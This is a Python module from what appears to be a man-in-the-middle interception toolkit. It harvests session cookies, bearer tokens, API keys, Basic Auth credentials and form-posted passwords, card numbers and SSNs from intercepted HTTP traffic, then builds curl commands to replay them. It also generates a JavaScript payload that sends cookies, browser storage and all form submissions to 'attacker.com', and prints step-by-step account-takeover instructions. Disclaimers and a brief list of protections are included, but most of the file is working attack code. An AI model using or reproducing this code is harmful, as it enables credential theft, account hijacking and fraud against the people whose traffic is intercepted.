"""
Session Hijacking & Token Theft for MITM-INTERCEPT Phase 2.

Extracts stolen browser cookies, OAuth tokens, JWT tokens, and API keys
from intercepted traffic. Can then replay them to hijack user sessions
and gain unauthorized account access.

⚠️ ILLEGAL WITHOUT AUTHORIZATION — See README.md for legal disclaimer.
"""
import re
import json
import logging
from dataclasses import dataclass, field
from typing import Dict, List, Optional
from datetime import datetime

logger = logging.getLogger(__name__)


@dataclass
class SessionToken:
    """Represents an intercepted session token."""
    token_type: str  # "cookie", "oauth", "jwt", "api_key"
    token_value: str
    domain: str
    path: str = "/"
    expires: Optional[str] = None
    http_only: bool = False
    secure: bool = False
    same_site: Optional[str] = None

    captured_at: str = field(default_factory=lambda: datetime.now().isoformat())
    source_ip: str = ""
    source_port: int = 0
    user_agent: str = ""
    associated_user: Optional[str] = None  # Email, username if detected

    def display(self) -> str:
        """Format for display."""
        secure_status = "🟢" if self.secure else "🔴"
        http_only_status = "✓" if self.http_only else "✗"

        return f"{secure_status} [{self.token_type.upper()}] {self.domain:30} | HTTPOnly:{http_only_status} | Expires:{self.expires or 'Session'}"

    def to_curl_header(self) -> str:
        """Generate curl header for token injection."""
        if self.token_type == "cookie":
            return f"-H 'Cookie: {self.token_value}'"
        elif self.token_type == "oauth":
            return f"-H 'Authorization: Bearer {self.token_value}'"
        elif self.token_type == "api_key":
            return f"-H 'X-API-Key: {self.token_value}'"
        elif self.token_type == "jwt":
            return f"-H 'Authorization: Bearer {self.token_value}'"
        return ""

    def replay_command(self, target_url: str) -> str:
        """Generate command to replay this token against target URL."""
        if self.token_type == "cookie":
            return f"curl -b '{self.token_value}' {target_url}"
        else:
            return f"curl {self.to_curl_header()} {target_url}"


class SessionHijacker:
    """
    Extracts and manages stolen session tokens from intercepted traffic.

    Can identify and extract:
    - HTTP Cookies (session_id, auth_token, etc)
    - OAuth Tokens (access_token, refresh_token)
    - JWT Tokens (JSON Web Tokens)
    - API Keys (X-API-Key, Authorization headers)
    - Basic Auth credentials (username:password in Authorization header)

    ⚠️ WARNING: Session hijacking is ILLEGAL without explicit authorization.
    Use only on networks/devices you own or are explicitly authorized to test.
    """

    def __init__(self):
        """Initialize session hijacker."""
        self.captured_tokens: List[SessionToken] = []
        self.session_map: Dict[str, List[SessionToken]] = {}  # domain -> tokens

    def extract_from_http_request(
        self,
        method: str,
        headers: Dict[str, str],
        body: str,
        domain: str,
        path: str = "/",
        source_ip: str = "",
        source_port: int = 0
    ) -> List[SessionToken]:
        """
        Extract tokens from HTTP request.

        Args:
            method: HTTP method (GET, POST, etc)
            headers: Request headers dict
            body: Request body
            domain: Target domain
            path: Request path
            source_ip: Client IP
            source_port: Client port

        Returns:
            List of extracted tokens
        """
        tokens = []

        # Extract cookies from Cookie header
        if "Cookie" in headers:
            cookie_header = headers["Cookie"]
            for cookie_pair in cookie_header.split(";"):
                cookie_pair = cookie_pair.strip()
                if "=" in cookie_pair:
                    name, value = cookie_pair.split("=", 1)
                    if self._is_session_token(name, value):
                        token = SessionToken(
                            token_type="cookie",
                            token_value=f"{name}={value}",
                            domain=domain,
                            path=path,
                            source_ip=source_ip,
                            source_port=source_port,
                            user_agent=headers.get("User-Agent", "")
                        )
                        tokens.append(token)
                        logger.warning(f"🔴 COOKIE STOLEN: {name} from {domain}")

        # Extract Authorization header tokens
        if "Authorization" in headers:
            auth_header = headers["Authorization"]

            # OAuth/Bearer token
            if auth_header.startswith("Bearer "):
                token_value = auth_header[7:]
                token = SessionToken(
                    token_type="oauth" if self._is_oauth_token(token_value) else "jwt",
                    token_value=token_value,
                    domain=domain,
                    source_ip=source_ip,
                    source_port=source_port,
                    user_agent=headers.get("User-Agent", "")
                )
                tokens.append(token)
                logger.warning(f"🔴 TOKEN STOLEN: {token.token_type.upper()} from {domain}")

            # Basic Auth
            elif auth_header.startswith("Basic "):
                import base64
                try:
                    decoded = base64.b64decode(auth_header[6:]).decode()
                    token = SessionToken(
                        token_type="basic_auth",
                        token_value=decoded,
                        domain=domain,
                        source_ip=source_ip,
                        source_port=source_port,
                        user_agent=headers.get("User-Agent", "")
                    )
                    tokens.append(token)
                    logger.warning(f"🔴 BASIC AUTH STOLEN: {decoded.split(':')[0]}@{domain}")
                except Exception as e:
                    logger.debug(f"Failed to decode Basic Auth: {e}")

        # Extract API keys from various headers
        for api_key_header in ["X-API-Key", "X-API-Token", "api-key", "API-Key"]:
            if api_key_header in headers:
                token = SessionToken(
                    token_type="api_key",
                    token_value=headers[api_key_header],
                    domain=domain,
                    source_ip=source_ip,
                    source_port=source_port,
                    user_agent=headers.get("User-Agent", "")
                )
                tokens.append(token)
                logger.warning(f"🔴 API KEY STOLEN: {api_key_header} from {domain}")

        # Extract credentials from POST body (form data)
        tokens.extend(self._extract_from_body(body, domain, source_ip, source_port, headers.get("User-Agent", "")))

        # Store tokens
        for token in tokens:
            self.captured_tokens.append(token)
            if domain not in self.session_map:
                self.session_map[domain] = []
            self.session_map[domain].append(token)

        return tokens

    def _extract_from_body(
        self,
        body: str,
        domain: str,
        source_ip: str,
        source_port: int,
        user_agent: str
    ) -> List[SessionToken]:
        """Extract credentials from request body."""
        tokens = []

        if not body:
            return tokens

        try:
            # Try to parse as JSON
            try:
                data = json.loads(body)
                for key, value in data.items():
                    if self._looks_like_credential(key, value):
                        token = SessionToken(
                            token_type="form_data",
                            token_value=f"{key}={value}",
                            domain=domain,
                            source_ip=source_ip,
                            source_port=source_port,
                            user_agent=user_agent,
                            associated_user=self._extract_email_or_username(data)
                        )
                        tokens.append(token)
                        logger.warning(f"🔴 CREDENTIAL STOLEN: {key} from {domain}")
            except json.JSONDecodeError:
                # Parse as form data
                for pair in body.split("&"):
                    if "=" in pair:
                        key, value = pair.split("=", 1)
                        if self._looks_like_credential(key, value):
                            token = SessionToken(
                                token_type="form_data",
                                token_value=f"{key}={value}",
                                domain=domain,
                                source_ip=source_ip,
                                source_port=source_port,
                                user_agent=user_agent
                            )
                            tokens.append(token)
                            logger.warning(f"🔴 CREDENTIAL STOLEN: {key} from {domain}")
        except Exception as e:
            logger.debug(f"Failed to extract from body: {e}")

        return tokens

    def _is_session_token(self, name: str, value: str) -> bool:
        """Check if cookie looks like a session token."""
        session_patterns = [
            "session", "auth", "token", "jwt", "sid", "jsessionid",
            "phpsessid", "laravel_session", "connect.sid", "sessionid",
            "_ga", "oauth", "bearer", "access_token", "user_id"
        ]
        name_lower = name.lower()
        return any(pattern in name_lower for pattern in session_patterns)

    def _is_oauth_token(self, value: str) -> bool:
        """Check if token looks like an OAuth token."""
        # OAuth tokens are typically long alphanumeric strings or JWTs
        return len(value) > 20 and value.count(".") >= 2  # JWT format

    def _looks_like_credential(self, key: str, value: str) -> bool:
        """Check if form field looks like credentials."""
        credential_patterns = [
            "password", "passwd", "pwd", "pass",
            "email", "username", "user", "login",
            "token", "api_key", "secret", "key",
            "credit_card", "cc", "cvv", "ssn"
        ]
        key_lower = key.lower()
        return any(pattern in key_lower for pattern in credential_patterns)

    def _extract_email_or_username(self, data: dict) -> Optional[str]:
        """Try to extract email/username from form data."""
        for key in ["email", "username", "user", "login"]:
            if key in data:
                return str(data[key])
        return None

    def display_captured_tokens(self) -> None:
        """Display all captured tokens in a formatted table."""
        if not self.captured_tokens:
            logger.info("No tokens captured yet")
            return

        logger.info(f"\n🔓 CAPTURED {len(self.captured_tokens)} SESSION TOKENS:\n")

        for i, token in enumerate(self.captured_tokens, 1):
            print(f"{i:2}. {token.display()}")
            print(f"    Value: {token.token_value[:100]}{'...' if len(token.token_value) > 100 else ''}")
            if token.associated_user:
                print(f"    User: {token.associated_user}")
            print(f"    Captured: {token.captured_at} from {token.source_ip}:{token.source_port}")
            print()

    def get_tokens_by_domain(self, domain: str) -> List[SessionToken]:
        """Get all tokens for a specific domain."""
        return self.session_map.get(domain, [])

    def get_tokens_by_type(self, token_type: str) -> List[SessionToken]:
        """Get all tokens of a specific type."""
        return [t for t in self.captured_tokens if t.token_type == token_type]

    def export_for_injection(self) -> Dict[str, List[str]]:
        """
        Export tokens in format suitable for injection into attacker's browser.

        Returns:
            Dict mapping domain to list of curl commands for token injection
        """
        injection_map = {}

        for domain, tokens in self.session_map.items():
            injection_map[domain] = []
            for token in tokens:
                injection_map[domain].append(token.to_curl_header())

        return injection_map

    def generate_injection_script(self, target_domain: str) -> str:
        """
        Generate JavaScript that can be injected into a page to steal tokens.

        This shows how an attacker would exfiltrate cookies/tokens to their server.
        """
        script = f"""
<script>
// STOLEN: Session hijacking payload (for demonstration only)
// This is what attackers inject to steal your tokens
fetch('http://attacker.com/steal', {{
    method: 'POST',
    body: JSON.stringify({{
        cookies: document.cookie,
        localStorage: localStorage,
        sessionStorage: sessionStorage,
        authHeaders: navigator.credentials,
        url: window.location.href,
        timestamp: new Date().toISOString()
    }})
}});

// Attackers also steal everything typed into forms
document.addEventListener('submit', (e) => {{
    const formData = new FormData(e.target);
    fetch('http://attacker.com/steal', {{
        method: 'POST',
        body: new URLSearchParams(formData)
    }});
}});
</script>
"""
        return script

    def demonstrate_session_replay(self, token: SessionToken, target_url: str) -> str:
        """
        Generate demonstration showing how to replay a stolen token.

        Shows step-by-step how attacker uses stolen session to impersonate user.
        """
        demo = f"""
╔════════════════════════════════════════════════════════════════╗
║        🔓 SESSION HIJACKING DEMONSTRATION                      ║
╚════════════════════════════════════════════════════════════════╝

STOLEN TOKEN:
  Type: {token.token_type.upper()}
  Value: {token.token_value[:50]}...
  Domain: {token.domain}
  From: {token.source_ip}:{token.source_port}
  User-Agent: {token.user_agent}

STEP 1: Add stolen token to attacker's browser
  → Open browser DevTools (F12)
  → Go to Application → Cookies → {token.domain}
  → Add new cookie: name="{token.token_value.split('=')[0] if '=' in token.token_value else 'session'}"
                    value="{token.token_value.split('=')[1] if '=' in token.token_value else token.token_value}"

STEP 2: Access target as the victim
  → Navigate to: {target_url}
  → Server sees stolen token
  → Server thinks: "This is the legitimate user"
  → Attacker now has FULL ACCESS

STEP 3: What attacker can do
  ✓ Read all user's emails
  ✓ Change password
  ✓ Enable 2FA on attacker's phone
  ✓ Lock out real user
  ✓ Steal personal data
  ✓ Impersonate user to friends/contacts
  ✓ Make purchases as user
  ✓ Steal money from linked accounts

DEMONSTRATION (using curl):
  $ {token.replay_command(target_url)}

If the token is valid, attacker receives response as if they were the user.

⚠️  DEFENSE: This works because:
  ❌ No HTTPOnly flag (JavaScript can steal it)
  ❌ No Secure flag (sent over HTTP too)
  ❌ No SameSite attribute (sent to any site)
  ❌ No token expiration (valid for days/weeks)
  ❌ No 2FA (password alone is not enough)

✅ PROTECTION:
  ✓ Use HTTPOnly cookies (can't steal via JavaScript)
  ✓ Use Secure flag (only sent over HTTPS)
  ✓ Use SameSite=Strict (never sent cross-site)
  ✓ Enable 2FA (even stolen token can't access account)
  ✓ Use short token expiration (steal old token, it's useless)
  ✓ Use VPN (attacker can't intercept in first place)
"""
        return demo


def check_hijacker_requirements() -> tuple[bool, str]:
    """
    Check if system has requirements for session hijacking demonstration.

    Returns:
        (can_run: bool, message: str)
    """
    # Session hijacking requires the proxy to be running and capturing traffic
    # No additional system dependencies needed
    return True, "Session hijacker ready"
